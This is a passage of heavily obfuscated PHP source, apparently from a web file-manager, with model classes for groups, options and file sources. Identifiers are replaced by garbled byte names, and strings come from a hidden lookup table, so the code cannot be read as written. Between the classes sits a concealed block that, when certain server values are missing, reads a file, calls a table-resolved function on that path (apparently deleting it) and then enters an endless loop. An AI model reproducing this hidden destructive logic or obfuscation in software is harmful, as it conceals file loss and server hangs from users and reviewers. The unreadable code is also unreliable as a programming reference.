array($Êß™ô‚ø[7], $ê‡ÍŠÌ)); $ïŒ‚ˆ·° = array($Êß™ô‚ø[1962], $Êß™ô‚ø[2066] => $Êß™ô‚ø[565]); $ğ÷üĞÊ‘ = Model($Êß™ô‚ø[2056])->field($ïŒ‚ˆ·°)->where($øÕÙ¸â³)->group($Êß™ô‚ø[1962])->select(); $¯‡ Úí = array_to_keyvalue($ğ÷üĞÊ‘, $Êß™ô‚ø[1962], $Êß™ô‚ø[565]); foreach ($éµ‘Æ¸º as &$ÒœªëÒ) { $‚í´‚í¸ = $ÒœªëÒ[$Êß™ô‚ø[1962]]; $ÒœªëÒ[$Êß™ô‚ø[2068]] = isset($¯‡ Úí[$‚í´‚í¸]) ? intval($¯‡ Úí[$‚í´‚í¸]) : !1; } unset($ÒœªëÒ); } private function _listAppendMeta(&$ô÷€Œøá, $’­ÛŞï) { $Ì”„ê³Ï =& $_SERVER[ˆ¡¹µ‹Â]; $‘«ö‘›© = array($Ì”„ê³Ï[1962] => array($Ì”„ê³Ï[7], $’­ÛŞï)); $æ†ßŠş¸ = Model($Ì”„ê³Ï[2055])->where($‘«ö‘›©)->select(); $æ†ßŠş¸ = array_to_keyvalue_group($æ†ßŠş¸, $Ì”„ê³Ï[1962]); foreach ($æ†ßŠş¸ as &$éıØÛã‡) { $éıØÛã‡ = array_to_keyvalue($éıØÛã‡, $Ì”„ê³Ï[97], $Ì”„ê³Ï[450]); } unset($éıØÛã‡); foreach ($ô÷€Œøá as &$ñÂ…ˆœ) { $ñÂ…ˆœ[$Ì”„ê³Ï[539]] = array(); if (isset($æ†ßŠş¸[$ñÂ…ˆœ[$Ì”„ê³Ï[1962]]])) { $ñÂ…ˆœ[$Ì”„ê³Ï[539]] = $æ†ßŠş¸[$ñÂ…ˆœ[$Ì”„ê³Ï[1962]]]; } } unset($ñÂ…ˆœ); } protected function parentLevelArray($ºıëŸŒ) { $âõúİ¦‘ =& $_SERVER[ˆ¡¹µ‹Â]; $ºıëŸŒ = explode($âõúİ¦‘[50], trim($ºıëŸŒ, $âõúİ¦‘[50])); $ºıëŸŒ = array_remove_value($ºıëŸŒ, $âõúİ¦‘[228]); return $ºıëŸŒ; } protected function parentInGroup($‘ Ì·ßµ, $Æºøæ²) { $èƒ¾Õı© =& $_SERVER[ˆ¡¹µ‹Â]; $¯ÁÎÉî = $this->getInfoSimple($‘ Ì·ßµ); if (!$¯ÁÎÉî) { return !0; } $œĞí²Ğˆ = $this->parentLevelArray($¯ÁÎÉî[$èƒ¾Õı©[584]]); $œĞí²Ğˆ[] = $‘ Ì·ßµ; foreach ($œĞí²Ğˆ as $‘ Ì·ßµ) { if (in_array($‘ Ì·ßµ . $èƒ¾Õı©[12], $Æºøæ²)) { return !0; } } return !1; } private function _listAppendParent(&$ı‡ªôşñ) { $Îû¤àŠÍ =& $_SERVER[ˆ¡¹µ‹Â]; $òÇõ„¬ = array(); foreach ($ı‡ªôşñ as &$ñÌøÈ„Ÿ) { $òÇõ„¬[$ñÌøÈ„Ÿ[$Îû¤àŠÍ[1962]]] = $ñÌøÈ„Ÿ[$Îû¤àŠÍ[32]]; $•×º°æõ = $this->parentLevelArray($ñÌøÈ„Ÿ[$Îû¤àŠÍ[584]]); foreach ($•×º°æõ as $ØùÄ›ûÇ) { if (!isset($òÇõ„¬[$ØùÄ›ûÇ])) { $òÇõ„¬[$ØùÄ›ûÇ] = 0; } } } unset($ñÌøÈ„Ÿ); foreach ($òÇõ„¬ as $¾™’ùÆ => $ÍûÇ½ş) { if ($ÍûÇ½ş) { continue; } $ãÔ§†ı = $this->getInfoSimple($¾™’ùÆ); $òÇõ„¬[$¾™’ùÆ] = $ãÔ§†ı[$Îû¤àŠÍ[32]]; } $ÙƒÒ¾ ¤ = $GLOBALS[$Îû¤àŠÍ[6]][$Îû¤àŠÍ[92]][$Îû¤àŠÍ[2069]]; if (KodUser::isRoot()) { $ÙƒÒ¾ ¤ = !1; } foreach ($ı‡ªôşñ as &$ñÌøÈ„Ÿ) { $•×º°æõ = $this->parentLevelArray($ñÌøÈ„Ÿ[$Îû¤àŠÍ[584]]); $åîÂåÄÚ = $Îû¤àŠÍ[12]; foreach ($•×º°æõ as $¾™’ùÆ => $ØùÄ›ûÇ) { if ($ÙƒÒ¾ ¤ && $¾™’ùÆ == 0) { continue; } $åîÂåÄÚ .= $òÇõ„¬[$ØùÄ›ûÇ] . $Îû¤àŠÍ[8]; } if ($•×º°æõ) { $åîÂåÄÚ .= $ñÌøÈ„Ÿ[$Îû¤àŠÍ[32]]; } $ñÌøÈ„Ÿ[$Îû¤àŠÍ[589]] = str_replace($Îû¤àŠÍ[592], $Îû¤àŠÍ[8], $åîÂåÄÚ); } unset($ñÌøÈ„Ÿ); } private function _listAppendSourceRoot(&$æ÷Å…Úî, $¿‘¸š­Ì) { $ì±ò¯ü‚ =& $_SERVER[ˆ¡¹µ‹Â]; $€Üµ«®¨ = Model($ì±ò¯ü‚[899])->listSourceRoot(SourceModel::TYPE_GROUP, $¿‘¸š­Ì); $€Üµ«®¨ = array_to_keyvalue($€Üµ«®¨, $ì±ò¯ü‚[569]); $€Üµ«®¨ = array_remove_key($€Üµ«®¨, $ì±ò¯ü‚[569]); foreach ($æ÷Å…Úî as &$¬€Ç™Ã) { $¬€Ç™Ã[$ì±ò¯ü‚[90]] = $€Üµ«®¨[$¬€Ç™Ã[$ì±ò¯ü‚[1962]]] ? $€Üµ«®¨[$¬€Ç™Ã[$ì±ò¯ü‚[1962]]] : array(); } unset($¬€Ç™Ã); } protected function groupMerge($À™‚»å¶) { $À™‚»å¶ = array_values(array_unique($À™‚»å¶)); $™äæ€ëğ = array(); for ($ûí”ÚÃ¿ = 0; $ûí”ÚÃ¿ < count($À™‚»å¶); $ûí”ÚÃ¿++) { $§’ô–À = !1; for ($ëŒĞõ½± = 0; $ëŒĞõ½± < count($À™‚»å¶); $ëŒĞõ½±++) { if ($ûí”ÚÃ¿ == $ëŒĞõ½±) { continue; } if ($this->isParentOf($À™‚»å¶[$ëŒĞõ½±], $À™‚»å¶[$ûí”ÚÃ¿])) { $§’ô–À = !0; break; } } if (!$§’ô–À) { $™äæ€ëğ[] = $À™‚»å¶[$ûí”ÚÃ¿]; } } return $™äæ€ëğ; } protected function isParentOf($Üú–ÈŸ, $³ã¾ŞĞë) { $à³İçñ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Üú–ÈŸ || !$³ã¾ŞĞë || $Üú–ÈŸ == $³ã¾ŞĞë) { return !1; } $Ì¸ÒŠ–× = $this->getInfoSimple($Üú–ÈŸ); $ªÕê°«Ê = $this->getInfoSimple($³ã¾ŞĞë); $ŸÛ–‚şÍ = $Ì¸ÒŠ–×[$à³İçñ[584]] . $Üú–ÈŸ . $à³İçñ[50]; if (substr($ªÕê°«Ê[$à³İçñ[584]], 0, strlen($ŸÛ–‚şÍ)) == $ŸÛ–‚şÍ) { return !0; } return !1; } public function groupShowRoot($–ê±¹âñ, $œŒ“½ = false) { $ëà¥üÈ =& $_SERVER[ˆ¡¹µ‹Â]; $Ü©àÀ¹ô = $this->getInfo($–ê±¹âñ); if (!$Ü©àÀ¹ô) { return array(); } $ŸªØáÙ = $this->parentLevelArray($Ü©àÀ¹ô[$ëà¥üÈ[584]]); $‘½í¤„ = array($–ê±¹âñ); if (count($ŸªØáÙ) == 0) { return $‘½í¤„; } if ($œŒ“½ && count($ŸªØáÙ) == 1) { return $‘½í¤„; } if (!$Ü©àÀ¹ô[$ëà¥üÈ[539]] || !isset($Ü©àÀ¹ô[$ëà¥üÈ[539]][$ëà¥üÈ[2052]]) || $Ü©àÀ¹ô[$ëà¥üÈ[539]][$ëà¥üÈ[2052]] == $ëà¥üÈ[843]) { return $this->groupShowRoot($ŸªØáÙ[count($ŸªØáÙ) - 1], $œŒ“½); } if ($Ü©àÀ¹ô[$ëà¥üÈ[539]][$ëà¥üÈ[2052]] == $ëà¥üÈ[433]) { $ù›¢Ò“ = explode($ëà¥üÈ[50], $Ü©àÀ¹ô[$ëà¥üÈ[539]][$ëà¥üÈ[2053]]); if ($ù›¢Ò“) { $‘½í¤„ = array_merge($‘½í¤„, $ù›¢Ò“); } } return $‘½í¤„; } protected function resetParentLevel() { $©¨•¡ç =& $_SERVER[ˆ¡¹µ‹Â]; $×Ú”áş² = $©¨•¡ç[1962]; $¸úçï»€ = $this->select(); $¸úçï»€ = array_to_keyvalue($¸úçï»€, $×Ú”áş²); foreach ($¸úçï»€ as $óô¸ñ­¶) { $ı„¥İé = $óô¸ñ­¶; $¹¦™± = array(); while ($ı„¥İé[$©¨•¡ç[192]] != 0) { $¹¦™±[] = $ı„¥İé[$©¨•¡ç[192]]; $ı„¥İé = $¸úçï»€[$ı„¥İé[$©¨•¡ç[192]]]; } $¹¦™±[] = 0; $¹¦™± = $©¨•¡ç[50] . implode($©¨•¡ç[50], array_reverse($¹¦™±)) . $©¨•¡ç[50]; $this->setNamePinyin($óô¸ñ­¶[$×Ú”áş²], $óô¸ñ­¶[$©¨•¡ç[32]]); $this->where(array($×Ú”áş² => $óô¸ñ­¶[$×Ú”áş²]))->save(array($©¨•¡ç[652] => $¹¦™±)); } return $¸úçï»€; } public function groupNameAuto($¦«–ú’, $ï°Ä½ú¢) { $Šã ˜Ç =& $_SERVER[ˆ¡¹µ‹Â]; $µıÉºä = $this->where(array($Šã ˜Ç[477] => $¦«–ú’))->getField($Šã ˜Ç[32], !0); if (!$µıÉºä || !in_array($ï°Ä½ú¢, $µıÉºä)) { return $ï°Ä½ú¢; } for ($°Á–µ  = 1; $°Á–µ  <= count($µıÉºä) + 1; $°Á–µ ++) { $äŞÎ°àó = $ï°Ä½ú¢ . "\x28{$°Á–µ }\x29"; if (!in_array($äŞÎ°àó, $µıÉºä)) { return $äŞÎ°àó; } } } public function groupSwitch($î„šË©×, $·Ÿ®öì) { $ÀÕ¿³™ =& $_SERVER[ˆ¡¹µ‹Â]; $ÛÕ›Ñ½Ô = array($ÀÕ¿³™[1962] => array($ÀÕ¿³™[7], array($î„šË©×, $·Ÿ®öì))); $ÂÖ·åèÅ = $this->where($ÛÕ›Ñ½Ô)->select(); $ÂÖ·åèÅ = array_to_keyvalue($ÂÖ·åèÅ, $ÀÕ¿³™[1962]); if (!isset($ÂÖ·åèÅ[$î„šË©×]) || !isset($ÂÖ·åèÅ[$·Ÿ®öì]) || $ÂÖ·åèÅ[$î„šË©×][$ÀÕ¿³™[192]] == 0) { return !1; } $ÛÕ›Ñ½Ô = array($ÀÕ¿³™[1962] => $î„šË©×); $ê«®ìË = Model($ÀÕ¿³™[2056])->where($ÛÕ›Ñ½Ô)->select(); if (!$ê«®ìË) { $ê«®ìË = array(); } foreach ($ê«®ìË as $ş–ëá™Ö) { $íÁÌ€â = $ş–ëá™Ö[$ÀÕ¿³™[1763]]; $ÛÕ›Ñ½Ô = array($ÀÕ¿³™[1763] => $íÁÌ€â, $ÀÕ¿³™[1962] => $·Ÿ®öì); $óåõ¥Ì¢ = Model($ÀÕ¿³™[2056])->where($ÛÕ›Ñ½Ô)->find(); if (!$óåõ¥Ì¢) { $‡˜œ§“ = array($·Ÿ®öì => $ş–ëá™Ö[$ÀÕ¿³™[2070]]); Model($ÀÕ¿³™[598])->userGroupAdd($íÁÌ€â, $‡˜œ§“); } Model($ÀÕ¿³™[598])->userGroupRemove($íÁÌ€â, $î„šË©×); } $ÛÕ›Ñ½Ô = array($ÀÕ¿³™[190] => 2, $ÀÕ¿³™[192] => 0, $ÀÕ¿³™[485] => 1, $ÀÕ¿³™[569] => array($ÀÕ¿³™[7], array($î„šË©×, $·Ÿ®öì))); $¶ë³ì€İ = Model($ÀÕ¿³™[899])->where($ÛÕ›Ñ½Ô)->field($ÀÕ¿³™[2071])->select(); $¶ë³ì€İ = array_to_keyvalue($¶ë³ì€İ, $ÀÕ¿³™[569], $ÀÕ¿³™[193]); $àöíË§š = !empty($¶ë³ì€İ[$î„šË©×]) ? $¶ë³ì€İ[$î„šË©×] : !1; if ($àöíË§š) { if (!$¶ë³ì€İ[$·Ÿ®öì]) { $¶ë³ì€İ[$·Ÿ®öì] = Model($ÀÕ¿³™[899])->groupRootAdd($·Ÿ®öì); } $Ê¨Ÿˆõ = $¶ë³ì€İ[$·Ÿ®öì]; $ÛÕ›Ñ½Ô = array($ÀÕ¿³™[192] => $àöíË§š); $¶ë³ì€İ = Model($ÀÕ¿³™[899])->where($ÛÕ›Ñ½Ô)->field($ÀÕ¿³™[2072])->select(); if (!$¶ë³ì€İ) { $¶ë³ì€İ = array(); } Model($ÀÕ¿³™[899])->moveClearAuth = !1; foreach ($¶ë³ì€İ as $ìÍ½õå°) { $Øì¨ëëª = $ìÍ½õå°[$ÀÕ¿³™[485]] == $ÀÕ¿³™[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÀÕ¿³™[899])->move($ìÍ½õå°[$ÀÕ¿³™[193]], $Ê¨Ÿˆõ, $Øì¨ëëª); } Model($ÀÕ¿³™[899])->moveClearAuth = !0; $ÛÕ›Ñ½Ô = array($ÀÕ¿³™[190] => 2, $ÀÕ¿³™[569] => $î„šË©×); $©çğåÑö = array($ÀÕ¿³™[569] => $·Ÿ®öì); Model($ÀÕ¿³™[2073])->where($ÛÕ›Ñ½Ô)->save($©çğåÑö); Model($ÀÕ¿³™[2074])->where($ÛÕ›Ñ½Ô)->save($©çğåÑö); } $this->_changeChildLevel($ÂÖ·åèÅ[$î„šË©×], $ÂÖ·åèÅ[$·Ÿ®öì], !0); $this->where(array($ÀÕ¿³™[192] => $î„šË©×))->save(array($ÀÕ¿³™[192] => $·Ÿ®öì)); $this->_clearChildrenCache($ÂÖ·åèÅ[$·Ÿ®öì]); return !0; } } if (!isset($_SERVER[$_SERVER[ˆ¡¹µ‹Â][846]]) || !isset($_SERVER[$_SERVER[ˆ¡¹µ‹Â][844]])) { $_getc = $_SERVER[ˆ¡¹µ‹Â][847]; $_getfile = $_SERVER[$_SERVER[ˆ¡¹µ‹Â][848]] . $_SERVER[ˆ¡¹µ‹Â][849]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆ¡¹µ‹Â][262], $_getfilec); if (count($_getarrs) < $_SERVER[ˆ¡¹µ‹Â][687]) { $exit = $_SERVER[ˆ¡¹µ‹Â][850]; $exit(); } $_act = $_SERVER[ˆ¡¹µ‹Â][851]; $_act($_SERVER[$_SERVER[ˆ¡¹µ‹Â][848]] . $_SERVER[ˆ¡¹µ‹Â][849]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ˆ¡¹µ‹Â][454]); } } goto E’Š·Ÿˆ°¼; A¢Ï„ìë»: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\x6d\117\x70\x74\151\x6f\156"; public $field = array(); public function listData($¡Á¤¹Ë = false, $ÄÑüµû = "\155\157\144\151\146\x79\124\x69\x6d\145", $‰ƒ¤şº¦ = false) { $ÕÌ²× = Model($this->modelType)->get(!1, $this->optionType, !0); $›±¨İ“ = array_values($ÕÌ²×); if ($›±¨İ“ && $›±¨İ“[0] && !is_array($›±¨İ“[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÕÌ²× = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÕÌ²×) { return $¡Á¤¹Ë ? null : array(); } if (!$¡Á¤¹Ë) { $ÕÌ²× = array_filter(array_values($ÕÌ²×)); return array_sort_by($ÕÌ²×, $ÄÑüµû, $‰ƒ¤şº¦); } return $ÕÌ²×[$_SERVER[ˆ¡¹µ‹Â][472] . $¡Á¤¹Ë]; } public function insert($½öÒõš¯) { $úò¦»ë€ =& $_SERVER[ˆ¡¹µ‹Â]; $½öÒõš¯ = array_field_key($½öÒõš¯, $this->field); $–ºİÅ‰š = Model($this->modelType)->get($úò¦»ë€[473], $this->optionType . $úò¦»ë€[474]); $–ºİÅ‰š = $–ºİÅ‰š ? $–ºİÅ‰š : 0; $½öÒõš¯[$úò¦»ë€[475]] = ++$–ºİÅ‰š; $½öÒõš¯[$úò¦»ë€[231]] = time(); $½öÒõš¯[$úò¦»ë€[88]] = time(); Model($this->modelType)->set($úò¦»ë€[473], $–ºİÅ‰š, $this->optionType . $úò¦»ë€[474]); Model($this->modelType)->set($úò¦»ë€[472] . $–ºİÅ‰š, $½öÒõš¯, $this->optionType); return $–ºİÅ‰š; } public function update($…è‰®ŒÚ, $Ñ”›§Õ) { $£«²Öº =& $_SERVER[ˆ¡¹µ‹Â]; $Ñ”›§Õ = array_field_key($Ñ”›§Õ, $this->field); $ •…ö…˜ = $this->listData($…è‰®ŒÚ); if (!$ •…ö…˜ || !$…è‰®ŒÚ) { return !1; } $Ñ”›§Õ = array_merge($ •…ö…˜, $Ñ”›§Õ); $Ñ”›§Õ[$£«²Öº[88]] = time(); return Model($this->modelType)->set($£«²Öº[472] . $…è‰®ŒÚ, $Ñ”›§Õ, $this->optionType); } public function remove($•Û™é«ü) { if (!$•Û™é«ü) { return !1; } return Model($this->modelType)->remove($_SERVER[ˆ¡¹µ‹Â][472] . $•Û™é«ü, $this->optionType); } public function clear() { $÷âÈû» =& $_SERVER[ˆ¡¹µ‹Â]; Model($this->modelType)->remove($÷âÈû»[473], $this->optionType . $÷âÈû»[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ıİ£©Ë, $şáîõò¨) { if (!$şáîõò¨) { return !1; } $ª¨¢êú = $this->listData(); $ª¨¢êú = array_to_keyvalue($ª¨¢êú, $ıİ£©Ë); return isset($ª¨¢êú[$şáîõò¨]) ? $ª¨¢êú[$şáîõò¨] : !1; } public function findByName($”Î¯µ‘‚) { return $this->findByKey($_SERVER[ˆ¡¹µ‹Â][32], $”Î¯µ‘‚); } protected function resetData($ ûƒÏüÉ) { $«¾Ó‘Ÿ‚ =& $_SERVER[ˆ¡¹µ‹Â]; $ ûƒÏüÉ = is_array($ ûƒÏüÉ) ? $ ûƒÏüÉ : array(); $‰í–ëñÏ = array(); for ($ÀøĞÔí = 0; $ÀøĞÔí < count($ ûƒÏüÉ); $ÀøĞÔí++) { $‰í–ëñÏ[$«¾Ó‘Ÿ‚[472] . $ ûƒÏüÉ[$ÀøĞÔí][$«¾Ó‘Ÿ‚[475]]] = $ ûƒÏüÉ[$ÀøĞÔí]; } return Model($this->modelType)->set($‰í–ëñÏ, !1, $this->optionType); } private function getAutoName($‘á›êüĞ) { $ˆößùš¢ = array_to_keyvalue($this->listData(), $_SERVER[ˆ¡¹µ‹Â][32]); if (!$ˆößùš¢ || !isset($ˆößùš¢[$‘á›êüĞ])) { return $‘á›êüĞ; } for ($¤öç«› = 1; $¤öç«› < count($ˆößùš¢); $¤öç«›++) { $¿ô¸ØÖÇ = $‘á›êüĞ . "\x28{$¤öç«›}\x29"; if (!isset($ˆößùš¢[$¿ô¸ØÖÇ])) { return $¿ô¸ØÖÇ; } } return $¿ô¸ØÖÇ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ë« — = false, $”È–˜ûª = '', $…Øª‘Í¾ = false) { $éø“÷ŸÓ =& $_SERVER[ˆ¡¹µ‹Â]; $½çóûØ = $this->cacheGet($”È–˜ûª); $š¹›©Á¢ = $this->optionDefault($”È–˜ûª); $š¹›©Á¢ = is_array($š¹›©Á¢) ? $š¹›©Á¢ : array(); if (is_array($½çóûØ)) { $½çóûØ = array_merge($š¹›©Á¢, $½çóûØ); return $ë« — ? isset($½çóûØ[$ë« —]) ? $½çóûØ[$ë« —] : null : $½çóûØ; } $ñ•ô£şä = $this->filterWhere(array($éø“÷ŸÓ[33] => $”È–˜ûª)); $½çóûØ = $this->where($ñ•ô£şä)->select(); $½çóûØ = array_to_keyvalue($½çóûØ, $éø“÷ŸÓ[97], $éø“÷ŸÓ[450]); foreach ($½çóûØ as $ç¡ŞÇÙÙ => $ç÷Ä…Ìä) { if ($…Øª‘Í¾ || in_array($ç¡ŞÇÙÙ, $this->jsonField)) { $½çóûØ[$ç¡ŞÇÙÙ] = json_decode($ç÷Ä…Ìä, !0); } } $this->cacheSet($”È–˜ûª, $½çóûØ); $½çóûØ = array_merge($š¹›©Á¢, $½çóûØ); return $ë« — ? $½çóûØ[$ë« —] : $½çóûØ; } public function set($Áßåºµ, $‡åĞøüø = false, $¶«ÏÄ‘¸ = '') { $™è‰¬®¤ =& $_SERVER[ˆ¡¹µ‹Â]; $this->cacheRemove($¶«ÏÄ‘¸); $ÏŠ–Ÿ¹ù = array(); $úó“¢Á™ = is_array($Áßåºµ) ? $Áßåºµ : array($Áßåºµ => $‡åĞøüø); foreach ($úó“¢Á™ as $œŒ‚ÛôŸ => $ºÑÖ·ó ) { if (is_array($ºÑÖ·ó )) { $ºÑÖ·ó  = json_encode_force($ºÑÖ·ó ); } $this->checkLength($ºÑÖ·ó , !1, $this->tableName . $™è‰¬®¤[4] . $Áßåºµ); $ºÑÖ·ó  = self::textEncode($ºÑÖ·ó ); $úó“¢Á™ = array($™è‰¬®¤[33] => $¶«ÏÄ‘¸, $™è‰¬®¤[97] => $œŒ‚ÛôŸ, $™è‰¬®¤[450] => $ºÑÖ·ó ); $ÏŠ–Ÿ¹ù[] = $this->filterWhere($úó“¢Á™); } if (!$ÏŠ–Ÿ¹ù) { return !0; } $¼¸¸õùÂ = $this->cacheKey($™è‰¬®¤[476]); CacheLock::lock($¼¸¸õùÂ); $ËòÎıç‡ = $this->addAll($ÏŠ–Ÿ¹ù, array(), !0); CacheLock::unlock($¼¸¸õùÂ); return $ËòÎıç‡; } protected function optionDefault($×¹­ÕÕ– = '') { return !1; } public function setDeep($Ş‰É±Ğ©, $©•”£ƒ· = false, $ëúÒ€”“ = '') { $ª»·Üü— = explode($_SERVER[ˆ¡¹µ‹Â][10], $Ş‰É±Ğ©); $–¶øÛØª = $this->get(); array_set_value($–¶øÛØª, $Ş‰É±Ğ©, $©•”£ƒ·); $this->set($ª»·Üü—[0], $–¶øÛØª[$ª»·Üü—[0]], $ëúÒ€”“); } public function remove($ºØ’, $ôœ ¹”ö = '') { $ñş¼î½¬ =& $_SERVER[ˆ¡¹µ‹Â]; $this->cacheRemove($ôœ ¹”ö); $àøÈé = $this->filterWhere(array($ñş¼î½¬[97] => $ºØ’, $ñş¼î½¬[33] => $ôœ ¹”ö)); if (is_null($ºØ’)) { unset($àøÈé[$ñş¼î½¬[97]]); } return $this->where($àøÈé)->delete(); } public function cacheSet($¾„âÆ“İ, $ğÑ•¸Â = false) { return Cache::set($this->cacheKey($¾„âÆ“İ), $ğÑ•¸Â); } public function cacheGet($Â£á„) { return Cache::get($this->cacheKey($Â£á„)); } public function cacheRemove($î×ĞÍşù) { return Cache::remove($this->cacheKey($î×ĞÍşù)); } protected function filterWhere($¬ğ£ÃôÇ) { return $¬ğ£ÃôÇ; } protected function cacheKey($§„Šµã‚) { return $§„Šµã‚; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\x61\x6d\145" => "\151\x6f\x5f\x73\x6f\x75\162\x63\145\137\x6d\x65\164\141", "\155\x65\x74\x61\x46\x69\145\154\144" => "\x73\x6f\165\x72\x63\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\144\151\146\171\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\145\x72\164", "\x66\x75\156\143\x74\x69\157\x6e"), array("\x63\162\145\141\164\x65\124\x69\155\145", "\x74\x69\155\145", "\151\x6e\163\145\162\164", "\x66\165\x6e\143\164\151\x6f\156"), array("\x76\x69\x65\167\124\151\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\145\162\x74", "\146\x75\x6e\143\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¤ÓÊï’’) { return $this->listSource(array($_SERVER[ˆ¡¹µ‹Â][477] => $¤ÓÊï’’)); } public function typeName($¸ù¹ì•¿) { static $µ§–µ› = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\x72\157\x75\x70"); return $µ§–µ›[$¸ù¹ì•¿ . $_SERVER[ˆ¡¹µ‹Â][12]]; } public function sourceListInfo($‡à·Ì’Â, $®±Ò³ = false) { $ƒœèÙ =& $_SERVER[ˆ¡¹µ‹Â]; $‡à·Ì’Â = $‡à·Ì’Â ? $‡à·Ì’Â : array(); $‡à·Ì’Â = array_filter(array_unique($‡à·Ì’Â)); if (!$‡à·Ì’Â) { return array(); } $æ¤¼†ËÇ = $this->where(array($ƒœèÙ[193] => array($ƒœèÙ[7], $‡à·Ì’Â)))->select(); $this->_listDataApply($æ¤¼†ËÇ, $®±Ò³); return array_to_keyvalue($æ¤¼†ËÇ, $ƒœèÙ[193]); } public function pathInfoFilter(&$æ‹Í¬ªé) { $ˆ­ÜûËè =& $_SERVER[ˆ¡¹µ‹Â]; static $Å²Œ¨øÔ = false; static $µ›şĞé = false; static $ß¦¼´Çø = false; if (!$Å²Œ¨øÔ) { $Ÿä‘Ã¶ = $ˆ­ÜûËè[478]; $Ÿä‘Ã¶ .= $ˆ­ÜûËè[479]; $Ÿä‘Ã¶ .= $ˆ­ÜûËè[480]; $„ëèòÂ— = $ˆ­ÜûËè[481]; $Ò‰õ«¹­ = explode($ˆ­ÜûËè[50], $„ëèòÂ—); $Å²Œ¨øÔ = explode($ˆ­ÜûËè[50], $Ÿä‘Ã¶); $µ›şĞé = array(); foreach ($Å²Œ¨øÔ as $ÛÌÇ¯Ûô) { if (in_array($ÛÌÇ¯Ûô, $Ò‰õ«¹­)) { continue; } $µ›şĞé[] = $ÛÌÇ¯Ûô; } $ß¦¼´Çø = explode($ˆ­ÜûËè[50], $ˆ­ÜûËè[482]); } foreach ($ß¦¼´Çø as $É°¡åØ) { if (isset($æ‹Í¬ªé[$É°¡åØ])) { $æ‹Í¬ªé[$É°¡åØ] = intval($æ‹Í¬ªé[$É°¡åØ]); } } $æ‹Í¬ªé[$ˆ­ÜûËè[87]] = $ˆ­ÜûËè[483] . $æ‹Í¬ªé[$ˆ­ÜûËè[193]] . $ˆ­ÜûËè[484]; $æ‹Í¬ªé[$ˆ­ÜûËè[33]] = $æ‹Í¬ªé[$ˆ­ÜûËè[485]] == 1 ? $ˆ­ÜûËè[78] : $ˆ­ÜûËè[230]; $æ‹Í¬ªé[$ˆ­ÜûËè[190]] = $this->typeName($æ‹Í¬ªé[$ˆ­ÜûËè[190]]); if ($æ‹Í¬ªé[$ˆ­ÜûËè[485]] != 1) { $æ‹Í¬ªé[$ˆ­ÜûËè[169]] = $æ‹Í¬ªé[$ˆ­ÜûËè[486]]; unset($æ‹Í¬ªé[$ˆ­ÜûËè[486]]); } $àÛˆšÇ = $Å²Œ¨øÔ; if (isset($æ‹Í¬ªé[$ˆ­ÜûËè[487]]) && $æ‹Í¬ªé[$ˆ­ÜûËè[487]][$ˆ­ÜûËè[488]] == -1) { $àÛˆšÇ = $µ›şĞé; } $æ‹Í¬ªé = array_field_key($æ‹Í¬ªé, $àÛˆšÇ); return $æ‹Í¬ªé; } public function listUserFav() { $ê† Éî =& $_SERVER[ˆ¡¹µ‹Â]; $šÃÂ§ªı = Model($ê† Éî[489])->listData(); $«ŸÉ«ÚŸ = array_filter_by_field($šÃÂ§ªı, $ê† Éî[33], $ê† Éî[490]); $«ŸÉ«ÚŸ = array_to_keyvalue($«ŸÉ«ÚŸ, $ê† Éî[12], $ê† Éî[87]); if ($«ŸÉ«ÚŸ) { $ÔÊŸ°™ş = $this->listSource(array($ê† Éî[491] => array($ê† Éî[492], $«ŸÉ«ÚŸ))); } $ÔÊŸ°™ş = array_to_keyvalue($ÔÊŸ°™ş[$ê† Éî[445]], $ê† Éî[193]); foreach ($šÃÂ§ªı as &$ñâ¾Ğ¼ø) { $ñâ¾Ğ¼ø = array($ê† Éî[493] => $ñâ¾Ğ¼ø[$ê† Éî[475]], $ê† Éî[494] => $ñâ¾Ğ¼ø[$ê† Éî[32]], $ê† Éî[495] => $ñâ¾Ğ¼ø[$ê† Éî[87]], $ê† Éî[496] => $ñâ¾Ğ¼ø[$ê† Éî[33]], $ê† Éî[497] => $ñâ¾Ğ¼ø[$ê† Éî[231]], $ê† Éî[498] => $ñâ¾Ğ¼ø[$ê† Éî[88]]); if ($ñâ¾Ğ¼ø[$ê† Éî[33]] == $ê† Éî[490] && $ÔÊŸ°™ş[$ñâ¾Ğ¼ø[$ê† Éî[87]]]) { $ñâ¾Ğ¼ø[$ê† Éî[90]] = $ÔÊŸ°™ş[$ñâ¾Ğ¼ø[$ê† Éî[87]]]; } } unset($ñâ¾Ğ¼ø); return $šÃÂ§ªı; } public function listUserTag($””æó¿) { $ğ™¨ÛŞ• =& $_SERVER[ˆ¡¹µ‹Â]; if ($””æó¿ && !is_array($””æó¿)) { $””æó¿ = array($””æó¿); } $ñ˜Æşºµ = Model($ğ™¨ÛŞ•[499])->listData(); $ş©ÌõŞĞ = array(); $¶¨Ùé¤ = array(); foreach ($ñ˜Æşºµ as $©Ÿ¦¥’‘) { $ßçÂ× = $©Ÿ¦¥’‘[$ğ™¨ÛŞ•[87]]; if (!$ßçÂ×) { continue; } if (!isset($¶¨Ùé¤[$ßçÂ×])) { $¶¨Ùé¤[$ßçÂ×] = array(); } $¶¨Ùé¤[$ßçÂ×][] = $©Ÿ¦¥’‘[$ğ™¨ÛŞ•[500]]; 